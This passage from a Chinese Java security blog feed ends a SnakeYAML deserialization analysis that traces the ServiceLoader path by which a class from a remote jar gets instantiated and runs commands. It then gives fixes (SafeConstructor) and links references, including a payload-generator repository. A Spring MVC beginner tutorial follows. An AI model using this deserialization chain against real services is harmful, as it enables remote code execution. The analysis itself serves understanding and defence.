<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> S <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (knownProviders.hasNext())</span><br><span class="line">        <span class="keyword">return</span> knownProviders.next().getValue();</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">return</span> lookupIterator.next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>lookupIterator是ServiceLoader$LazyIterator，调用其next方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> S <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (acc == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        <span class="comment">// 获取下一个服务对象并将其返回</span></span><br><span class="line">        <span class="keyword">return</span> nextService();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 系统中存在一个安全管理器（SecurityManager 类的一个实例），这时方法需要在特权上下文中运行</span></span><br><span class="line">        PrivilegedAction&lt;S&gt; action = <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;S&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> S <span class="title function_">run</span><span class="params">()</span> &#123; <span class="keyword">return</span> nextService(); &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 这个方法在特权上下文中执行 PrivilegedAction&lt;S&gt; 对象的 run() 方法，这意味着它拥有 acc 所引用的 SecurityManager 对象授予的权限。run() 方法的结果作为 doPrivileged() 方法的结果返回，进而作为 next() 方法的结果返回</span></span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(action, acc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码用于在存在安全管理器的系统中以安全的方式获取下一个服务对象，这里直接进nextService函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> S <span class="title function_">nextService</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否还有下一个服务对象</span></span><br><span class="line">    <span class="keyword">if</span> (!hasNextService())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">    <span class="comment">// 获取下一个服务对象的类名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cn</span> <span class="operator">=</span> nextName;</span><br><span class="line">    nextName = <span class="literal">null</span>;</span><br><span class="line">    Class&lt;?&gt; c = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        c = Class.forName(cn, <span class="literal">false</span>, loader);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException x) &#123;</span><br><span class="line">        fail(service,</span><br><span class="line">                <span class="string">&quot;Provider &quot;</span> + cn + <span class="string">&quot; not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果获取类成功，方法将检查该类是否是 service 类型的子类</span></span><br><span class="line">    <span class="keyword">if</span> (!service.isAssignableFrom(c)) &#123;</span><br><span class="line">        fail(service,</span><br><span class="line">                <span class="string">&quot;Provider &quot;</span> + cn  + <span class="string">&quot; not a subtype&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 如果该类是 service 类型的子类，方法将会尝试通过cast方法创建一个实例对象 p，并将其存储到 providers 集合中</span></span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        <span class="type">S</span> <span class="variable">p</span> <span class="operator">=</span> service.cast(c.newInstance());</span><br><span class="line">        providers.put(cn, p);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">        fail(service,</span><br><span class="line">                <span class="string">&quot;Provider &quot;</span> + cn + <span class="string">&quot; could not be instantiated&quot;</span>,</span><br><span class="line">                x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>();          <span class="comment">// This cannot happen</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230722221149.png"><br>这里就是URL中jar包对应的恶意类，其构造方法中就存在命令执行函数</p>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ul>
<li>禁止yaml.load方法中的参数可控</li>
<li>使用<code>Yaml yaml = new Yaml(new SafeConstructor());</code><br>在<code>org\yaml\snakeyaml\constructor\SafeConstructor.class</code>构造函数中定义了反序列化类的白名单：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SafeConstructor</span><span class="params">(LoaderOptions loadingConfig)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(loadingConfig);</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.NULL, <span class="keyword">new</span> <span class="title class_">ConstructYamlNull</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.BOOL, <span class="keyword">new</span> <span class="title class_">ConstructYamlBool</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.INT, <span class="keyword">new</span> <span class="title class_">ConstructYamlInt</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.FLOAT, <span class="keyword">new</span> <span class="title class_">ConstructYamlFloat</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.BINARY, <span class="keyword">new</span> <span class="title class_">ConstructYamlBinary</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.TIMESTAMP, <span class="keyword">new</span> <span class="title class_">ConstructYamlTimestamp</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.OMAP, <span class="keyword">new</span> <span class="title class_">ConstructYamlOmap</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.PAIRS, <span class="keyword">new</span> <span class="title class_">ConstructYamlPairs</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.SET, <span class="keyword">new</span> <span class="title class_">ConstructYamlSet</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.STR, <span class="keyword">new</span> <span class="title class_">ConstructYamlStr</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.SEQ, <span class="keyword">new</span> <span class="title class_">ConstructYamlSeq</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put(Tag.MAP, <span class="keyword">new</span> <span class="title class_">ConstructYamlMap</span>());</span><br><span class="line">    <span class="built_in">this</span>.yamlConstructors.put((Object)<span class="literal">null</span>, undefinedConstructor);</span><br><span class="line">    <span class="built_in">this</span>.yamlClassConstructors.put(NodeId.scalar, undefinedConstructor);</span><br><span class="line">    <span class="built_in">this</span>.yamlClassConstructors.put(NodeId.sequence, undefinedConstructor);</span><br><span class="line">    <span class="built_in">this</span>.yamlClassConstructors.put(NodeId.mapping, undefinedConstructor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java-SnakeYaml反序列化漏洞Mi1k7ea </a><br><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">Java安全之SnakeYaml反序列化分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://paper.seebug.org/1657/">Snake Yaml 反序列化 (seebug.org)</a><br><a href="https://www.cnblogs.com/CoLo/p/16225141.html">Java安全之SnakeYaml反序列化分析 - Zh1z3ven - 博客园 (cnblogs.com)</a><br><a href="https://mvnrepository.com/artifact/org.yaml/snakeyaml">Maven Repository: org.yaml » snakeyaml (mvnrepository.com)</a><br><a href="https://yaml.org/">The Official YAML Web Site</a><br><a href="https://github.com/artsploit/yaml-payload/">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads (github.com)</a><br><a href="https://xz.aliyun.com/t/11599?time__1311=mqmx0DBD2QD=i=GODlOI30=KG=844xwrrD">SnakeYaml反序列化 - 先知社区 (aliyun.com)</a><br><a href="https://zhuanlan.zhihu.com/p/377303638">如何优雅使用 SPI 机制 - 知乎 (zhihu.com)</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/12783">https://xz.aliyun.com/t/12783</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础之Spring MVC框架</title>
    <url>/2022/12/02/Spring-MVC/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SpringMVC 是一种基于 Java 的实现 MVC 设计模型的请求驱动类型的轻量级 Web 框架</p>
<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello, World!"></a>Hello, World!</h1><ol>
<li><p><strong>创建Maven工程</strong> </p>
<p>参考<a href="https://www.cnblogs.com/ruoli-0/p/14020252.html">https://www.cnblogs.com/ruoli-0/p/14020252.html</a></p>
</li>
<li><p><strong>导入依赖</strong></p>
<ul>
<li>Spring MVC核心依赖</li>
<li>Web相关依赖（比如后续开发需要的json处理依赖、验证码组件依赖等等）</li>
</ul>
<p>在Maven中的pom.xml添加即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.spring mvc核心依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 2.web相关依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- jstl支持 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- servlet编译环境 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- jsp编译环境 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>web应用配置</strong></p>
<ul>
<li><p>war包配置</p>
<p>在pom.xml的project标签中配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springmvc-learn<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- war包配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建Web目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230419110946.png"></p>
<p>webapp目录就是我们的web目录，里面存放动态、静态资源和配置文件，如jsp文件、js文件、css文件、HTML文件等</p>
<p>WEB-INF目录下只有一个文件，就是web配置文件：web.xml</p>
</li>
<li><p>若无web.xml,则需要创建web.xml</p>
</li>
</ul>
</li>
<li><p>前端控制器（配置web.xml）</p>
<p>注册SpringMVC的前端控制器DispatcherServlet</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">前端控制器的作用：</span><br><span class="line">1. 前端、负责接收所有请求</span><br><span class="line">2. 加载mvc.xml，启动Spring MVC</span><br><span class="line">3. Spring MVC流程调度</span><br></pre></td></tr></table></figure>

<p>默认配置方式：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        设置springMVC的核心控制器所能处理的请求的请求路径</span></span><br><span class="line"><span class="comment">        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径</span></span><br><span class="line"><span class="comment">        但是/不能匹配.jsp请求路径的请求</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>扩展配置方式(推荐)：</p>
<p>可通过<code>init-param</code>标签设置SpringMVC配置文件的位置和名称，通过<code>load-on-startup</code>标签设置SpringMVC前端控制器DispatcherServlet的初始化时间</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 通过初始化参数指定SpringMVC配置文件的位置和名称 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- contextConfigLocation为固定值 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springMVC.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">             作为框架的核心组件，在启动过程中有大量的初始化操作要做</span></span><br><span class="line"><span class="comment">            而这些操作放在第一次请求时才执行会严重影响访问速度</span></span><br><span class="line"><span class="comment">            因此需要通过此标签将启动控制DispatcherServlet的初始化时间提前到服务器启动时</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            设置springMVC的核心控制器所能处理的请求的请求路径</span></span><br><span class="line"><span class="comment">            /所匹配的请求可以是/login或.html或.js或.css方式的请求路径</span></span><br><span class="line"><span class="comment">            但是/不能匹配.jsp请求路径的请求</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>后端控制器</p>
<p>创建后端控制器</p>
<p>在java目录下创建包：com.learn.web，在包中创建控制器类（普通POJO类）：HelloController.java</p>
<p>配置后端控制器：HelloController.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明控制器</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">//主路径，此类的所有方法对应的路径都以此开头</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/home&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从路径   即/home/login</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行登录方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从路径   即/home/register</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">register</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行注册方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;register&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是一个后端控制器</p>
<ul>
<li>此时该控制器没有作用，没有配置注解相关信息，在后续SpringMVC的配置文件中配置</li>
<li>return语句会跳到相应的页面</li>
</ul>
<p>在webapp目录创建两个文件：login.jsp和register.jsp</p>
<p>login.jsp:</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    登录界面</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>register.jsp:</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Register&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    注册界面</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Spring MVC配置文件</p>
<p>mvc.xml是Spring MVC项目的配置文件，我们要先创建mvc.xml，然后在里面配置我们的注解扫描、注解驱动、视图解析器等配置信息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span>     <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">                            http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                            http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">                            http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                            http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">                            http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--注解扫描--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.learn.web&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--注解驱动--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--视图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--前缀--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--后缀--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>注册mvc.xml</p>
<p>写好Spring MVC配置文件后，还需去加载它。前端控制器有一个作用就是加载mvc.xml配置文件，启动Spring MVC工厂</p>
<p>修改web.xml中的如下内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="comment">&lt;!-- 通过初始化参数指定SpringMVC配置文件的位置和名称 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- contextConfigLocation为固定值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>配置Tomcat，测试</p>
</li>
</ol>
<p>参考：<a href="https://www.cnblogs.com/ruoli-0/p/14020252.html">Spring MVC——项目的开发流程 - 城北有个混子 - 博客园 (cnblogs.com)</a></p>
<h1 id="RequestMapping注解"><a href="#RequestMapping注解" class="headerlink" title="@RequestMapping注解"></a>@RequestMapping注解</h1><p>属性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. path 指定请求路径的url</span><br><span class="line">2. value value属性和path属性是一样的</span><br><span class="line">3. mthod 指定该方法的请求方式</span><br><span class="line">4. params 指定限制请求参数的条件</span><br><span class="line">5. headers 发送的请求中必须包含的请求头</span><br></pre></td></tr></table></figure>

<h2 id="value"><a href="#value" class="headerlink" title="value"></a>value</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &#123;&quot;/test&quot;, &quot;/test1&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行了测试方法&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

